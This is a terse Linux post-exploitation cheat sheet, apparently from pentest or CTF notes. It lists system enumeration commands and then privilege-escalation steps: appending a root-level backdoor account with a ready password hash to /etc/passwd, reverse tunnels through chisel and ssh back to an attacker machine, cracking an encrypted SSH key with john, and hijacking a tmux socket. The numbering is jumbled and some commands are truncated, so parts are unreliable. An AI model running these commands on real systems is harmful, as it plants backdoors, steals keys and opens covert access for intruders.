## INTERNAL RECONNAISANCE
1.  Enumerating the operating system version and architecture
`cat /etc/issue`
`cat /etc/*-release*`
`uname -a`

2. Enumerating processes and services
`ps aux`

3. Enumerating Networking Information
`ip a`
`/sbin/route`
`ss -anp`

4. Enumerating Firewall status and rules
`grep -Hs iptables /etc/*`

5. Enumerating scheduled tasks
`cat /etc/crontab`
`ls -lah /etc/cron*`

6. Enumerating installed applications and patch levels
`dpkg -l`

7. Enumerating Readable/Writable Files and Directories
`find / -writable -type d 2>/dev/null`

8. Enumerating unmounted disks
`cat /etc/fstab`
`mount`
`/bin/lsblk`
`df -T`
`fdisk /dev/sdX -l`
`parted /dev/sdX -l`

9. Enumerating Device drivers and kernel modules
`lsmod`
`/sbin/modinfo libata`

10. Enumerating binaries that autoelevate 
`find / -perm -u=s -type f 2>/dev/null`

11. Insecure File Permissions

- CRON
`grep "CRON" /var/log/cron.log`

- /etc/passwd
`openssl passwd evil`
`echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd`

12. Finding specific folder
`find / -type d -name "dir-name-here" 2>/dev/null`

13. Look for user capabilities 

```
getcap -r / 2>/dev/null
```

10. Port-Forwarding or SSH Tunneling

 a. ./chisel client 10.10.14.21:8080 R:631:127.0.0.1:631 -- target machine

    ./chisel server --reverse -- host machine
    
 b. ssh user@ip -D 1080 -- forward all traffics on localhost port 1080

    edit /etc/proxychains.conf, add SOCKS 127.0.0.1 1080 

    ssh user@ip -L xxxx.127.0.0.1:xxxx 

    proxychains <command>

 c.  Port forwarding multiple hosts, ssh from kali to A, from A ssh to B, and from B ssh to your kali, **NOTE: edit your proxychains foy your desired ports**
`ssh -N -R \*:5050 kali@YOURIP`

11. Find a text file 
`find / -name "network-secret.txt"`

1. Attach tmux session

 `/usr/bin/tmux -S /.devs/dev_sess`

 3. Decrypt id_rsa key with password

   `/usr/share/john/ssh2john.py id_rsa.encrypted > id_rsa_ssh2john`

   `ohn --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_ssh2john`

   `penssl rsa -in hype_key_encrypted -out hype_key_decrypted`

 4. Finding SUID binaries

  `find / -perm -4000 2>/dev/null`
   
 5. Sudo privileges to run a binary or script to WRITE on file 
 -  Create a password using openssl
 ```
 openssl passwd -1 -salt qwaszx 123456
 ```
 -  Add the following to /etc/passswd
 ```
 qwaszx:$1$qwaszx$fqgpAA/cwVMPvvPGJkasj1:0:0::/root:/bin/bash
 ```
 - Add on the etc/passwd if the second command does not work
 `qwaszx:$1$qwaszx$fqgpAA/cwVMPvvPGJkasj1:1001:1001:qwaszx:/home/qwaszx:/bin/bash`
 
 6. Find writable files
 ```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

7. Creating an http server.
- php 
`php -S 0.0.0.0:8000`

- ruby
` ruby -run -e httpd . -p 9000`

- busybox
`busybox httpd -f -p 10000`



 
 